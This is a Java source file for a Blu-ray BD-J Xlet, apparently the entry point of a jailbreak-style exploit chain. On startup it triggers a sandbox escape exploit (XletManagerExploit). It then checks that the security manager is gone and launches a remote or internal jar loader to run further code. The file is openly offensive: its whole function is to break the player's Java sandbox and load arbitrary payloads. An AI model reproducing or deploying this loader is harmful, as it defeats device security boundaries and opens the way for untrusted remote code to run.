package org.bdj;

import java.awt.BorderLayout;
import javax.tv.xlet.Xlet;
import javax.tv.xlet.XletContext;
import org.havi.ui.HScene;
import org.havi.ui.HSceneFactory;

import org.bdj.sandbox.XletManagerExploit;

public class InitXlet implements Xlet {
    private HScene scene;
    private Screen screen;
    private RemoteJarLoader jarLoader;
    private Thread jarLoaderThread;
    private InternalJarLoader internalJarLoader;
    private Thread internalJarLoaderThread;
    private final String jarLoaderThreadName = "JarLoader";

    
    public void initXlet(XletContext context) {
        
        Status.setScreenOutputEnabled(false);
        
        Status.println("BD-J init");
        
        try {
            Status.println("Triggering sandbox escape exploit...");
            
            if (XletManagerExploit.trigger()) {
                Status.println("Exploit success - sandbox escape achieved");
            } else {
                Status.println("Exploit failed - sandbox still active");
            }
            
        } catch (Exception e) {
            Status.printStackTrace("Error when disabling sandbox: ", e);
        }
        
        // Do not enable the screen before this point.
        Status.setScreenOutputEnabled(true);

        screen = Screen.getInstance();
        screen.setSize(1920, 1080);

        scene = HSceneFactory.getInstance().getDefaultHScene();
        scene.add(screen, BorderLayout.CENTER);
        scene.validate();
    }
    
    public void startXlet() {
        screen.setVisible(true);
        scene.setVisible(true);
        
        // Log will be shown on Screen from this point.
        Status.println("Screen initialized");
        
        // Add sanity check
        if (System.getSecurityManager() == null) {
                        
            boolean UseInternalJar = true;

            if (!UseInternalJar) {
                try {
                    jarLoader = new RemoteJarLoader();
                    jarLoaderThread = new Thread(jarLoader, jarLoaderThreadName);
                    jarLoaderThread.start();
                } catch (Throwable e) {
                    Status.printStackTrace("Loader startup failed", e);
                }
            } else {
                try {
                    internalJarLoader = new InternalJarLoader();
                    internalJarLoaderThread = new Thread(internalJarLoader, jarLoaderThreadName);
                    internalJarLoaderThread.start();
                } catch (Throwable e) {
                    Status.printStackTrace("Loader startup failed", e);
                }
            }
            
        } else {
            Status.println("Sandbox is still activated");
        }
        
    }

    public void pauseXlet() {
        screen.setVisible(false);
    }

    public void destroyXlet(boolean unconditional) {
        scene.remove(screen);
        scene = null;
    }
}



